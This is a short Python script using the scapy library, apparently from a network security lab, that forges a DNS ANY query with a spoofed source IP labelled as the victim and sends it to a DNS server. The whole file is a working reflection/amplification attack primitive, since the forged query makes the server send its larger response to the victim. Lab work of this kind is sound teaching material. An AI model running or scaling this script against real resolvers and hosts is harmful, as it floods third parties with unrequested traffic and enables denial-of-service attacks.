from scapy.all import *

# DNS Target (open resolver or DNS server)
dns_server_ip = "10.9.0.53"  # change if needed

# Victim IP (spoofed source)
spoofed_ip = "10.9.0.5"

# Construct DNS ANY query
dns_query = IP(src=spoofed_ip, dst=dns_server_ip) / \
            UDP(sport=RandShort(), dport=53) / \
            DNS(id=0xAAAA, qr=0, qdcount=1,
                qd=DNSQR(qname="google.com", qtype=255))

# Send only one packet
send(dns_query)






